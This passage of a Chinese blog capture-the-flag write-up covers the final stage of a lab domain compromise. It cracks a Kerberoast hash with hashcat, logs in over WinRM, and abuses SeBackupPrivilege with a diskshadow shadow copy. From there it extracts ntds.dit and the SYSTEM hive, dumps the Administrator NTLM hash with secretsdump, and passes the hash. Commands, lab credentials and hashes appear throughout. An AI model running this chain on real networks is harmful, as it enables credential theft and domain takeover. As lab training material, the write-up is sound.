+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$krb5tgs$23$*tianjing$XIAORANG.LAB$xiaorang.lab/tianjing*$5980af1ee5113cf15982716f81fe292e$2de5fceb289adba19f53386ff2a37ff66cc21d791bb07fed8ecf32f6faaacd81e6b14c940112eeb5d916ec8399c05c749ca084611904528cecd863a277a3b1cde7894df22ddeb3f75376c36225bdd36ced1552f26e710ff6ba0f7ae3d7b18d40a53c3d542e760f1238729ceb36a3961f066b42dd884f20257734e669d6aa360ea6d95f31e5f78b5197f4d5bdaffab47560549f1b9d90dc42a27c3af406e598f3a0bf512dbbb4003e712c959a525835c003367f884122b6b6c91e15041db70880a8dbe14ea4f58491359c99e9a8286af633e8e8657fd384823802013138cbf2d69d500988a6291b0d6d97e179a5a7e7687d3c6be2f2dffed95b82ebc1c8707b03667ed0ff61943da5c339001e4504304389b7265939451b9b167d88ecff42d2c2ce54fdb5f8b510795b06f8622486299a3d1fa3e7651d2d1bfcbe3c389e4cccf8c3cea37f995a995ba02670e0884ecf8730009a3e1340c77877a47f932bc1f49dbb95177e310a726f696950849f2f9ded851349b872215fd6f6f175db296ffa3b7e4ee1268ba6d27e7d754f6bc2470d21e96b508e6da4a463fafd926e66835c8dff087e6ad5aa5ff41ca9ad0afda9dc1174d33b92271f28c914ea92ea6b1199b68905ed2f6b07712d81c9a79824d10cadfbcb279ff87c54bf8efdd0b6ab2ce8bc8c4af868b81747523f0f2ad92d0412b23a3b8660f89e69b318746f1125023e0c2e55df5d218f656c6734daa5bc6375fbad8669ab5e001066127ae7150eeeb50868f6dd31379a90bf50999d14000c166421f1d1033e3f5f3e31eb1033070b4305876c1cddbdd8b1b30ea92e0339ebd194f5418095b70c46e96b6b56a3cf707fbc9bfa9711b15e9c9de2bf4602d0cf698367ac43c62d58ae161a10fcb79acae09213f01c1b4256ac83580ca52dc671808dfc1c51b653fb12d31966151a74c930b891d88c2b2185f3d8d7f9172f58eed2af3506e6785e2198c3b21a1d33504f1c0bc3e50d13c00b5b1a5533f49429b6cfe45d9e7e3aa350500f70b47bf6066dbc0ea9128a3950ff3c9527bf53f6f6df27cb6d4e772ac4fb30c0e0e012168213105687d292a76e42c643f389ebe3dff94e9fedcaea101096a6b6e83fff935939df556c6e3be1b1d8b8ff087ac0abf5e057d42106647d4d9f039e0fc7805628cb0f2bd090448e07466012136734e881c2ade6d54514224d8402499560fb406e11de2d43bb1d6bceb1d5a0a6c9181db1f807e8afe10a1a3ae398b62b37afaebd5f7de3373e9e743e9294ed61d03631f85b63e093300692e80504e17b5e31fe3d061c69d0bbeaa48fa5c2679aa514fd10e15b72f6cfc96e815f4d6c8682ff88e9847a580268d628da8324846242c5afb6f1555a0498f5280758b32b406a96271ba14ff49a05cc5e01add9704cd358811e74bb4386a6af1d4e8fa09b64d2f0d6a765e280674fab25a2c9e0bf2b0e366b0760d79fda67874615</span><br></pre></td></tr></table></figure>
+
+<p>爆破hash</p>
+<p><code>hashcat -a 0 -m 13100 hash.txt rockyou.txt</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tianjing/DPQSXSXgh2</span><br></pre></td></tr></table></figure>
+
+<p>winrm连接</p>
+<p><code>proxychains evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2 </code></p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302142953841.png" alt="image-20250302142953841"></p>
+<p><code>whoami /priv</code>查看用户权限，发现又多一个SeBackupPrivilege</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2215108">谈谈域渗透中常见的可滥用权限及其应用场景（二）-腾讯云开发者社区-腾讯云</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9624?time__1311=n4+xnD0DuDRDgBWGkQD/ia+mxjr4f2Br+eDvQx">利用卷影拷贝服务提取ntds.dit - 先知社区</a> </p>
+<p>kali中创建raj.dsh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set context persistent nowriters</span><br><span class="line">add volume c: alias raj</span><br><span class="line">create</span><br><span class="line">expose %raj% z:</span><br></pre></td></tr></table></figure>
+
+<p>再用unix2dos将dsh文件的编码间距转换为Windows兼容的编码和间距</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302143435208.png" alt="image-20250302143435208"></p>
+<p> 在<code>C:/</code>下创个目录，上传raj.dsh</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302143554065.png" alt="image-20250302143554065"></p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302143916707.png" alt="image-20250302143916707"></p>
+<p>卷影拷贝</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302143905664.png" alt="image-20250302143905664"></p>
+<p>下载ntds.dit和system到kali上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RoboCopy /b z:\windows\ntds . ntds.dit</span><br><span class="line">download ntds.dit</span><br><span class="line">reg save HKLM\SYSTEM system</span><br><span class="line">download system</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302144512795.png" alt="image-20250302144512795"></p>
+<p> 解密出administrator的hash</p>
+<p><code>impacket-secretsdump -ntds ntds.dit -system system local</code></p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302145034166.png" alt="image-20250302145034166"></p>
+<blockquote>
+<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:70c39b547b7d8adec35ad7c09fb1d277:::</p>
+</blockquote>
+<p>pth winrm上去</p>
+<p><code>proxychains evil-winrm -i 172.22.14.11 -u Administrator -H &quot;70c39b547b7d8adec35ad7c09fb1d277&quot;</code></p>
+<p><img src="/image-20250302145159421.png" alt="image-20250302145159421"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io">P4tt0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cprivilege-wp/">https://p4tt0n.github.io/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cprivilege-wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://p4tt0n.github.io" target="_blank">P4tt0n's b10g</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post_share"><div class="social-share" data-image="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/" title="春秋云镜Hospital"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">春秋云镜Hospital</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/10/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/" title="春秋云镜Initial"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-10</div><div class="title">春秋云镜Initial</div></div></a></div><div><a href="/2025/02/21/Bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951-4/" title="Bugku渗透测试1-4"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-21</div><div class="title">Bugku渗透测试1-4</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/" title="春秋云镜Time"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜Time</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/" title="春秋云镜Tsclient"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜Tsclient</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cbrute4road/" title="春秋云镜brute4road"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜brute4road</div></div></a></div><div><a href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/" title="春秋云镜Hospital"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-02</div><div class="title">春秋云镜Hospital</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">P4tt0n</div><div class="author-info__description">徐徐前进！</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/p4tt0n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege"><span class="toc-number">1.</span> <span class="toc-text">Privilege</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">1.0.2.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">1.0.3.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="toc-number">1.0.4.</span> <span class="toc-text">第四关</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cprivilege-wp/" title="春秋云镜privilege-wp">春秋云镜privilege-wp</a><time datetime="2025-03-02T10:50:47.000Z" title="发表于 2025-03-02 18:50:47">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/" title="春秋云镜Hospital">春秋云镜Hospital</a><time datetime="2025-03-02T10:09:09.000Z" title="发表于 2025-03-02 18:09:09">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cexchange/" title="春秋云镜exchange">春秋云镜exchange</a><time datetime="2025-03-02T10:08:48.000Z" title="发表于 2025-03-02 18:08:48">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cdelegation/" title="春秋云镜delegation">春秋云镜delegation</a><time datetime="2025-03-02T10:08:33.000Z" title="发表于 2025-03-02 18:08:33">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Ccertify/" title="春秋云镜certify">春秋云镜certify</a><time datetime="2025-03-02T10:08:18.000Z" title="发表于 2025-03-02 18:08:18">2025-03-02</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By P4tt0n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
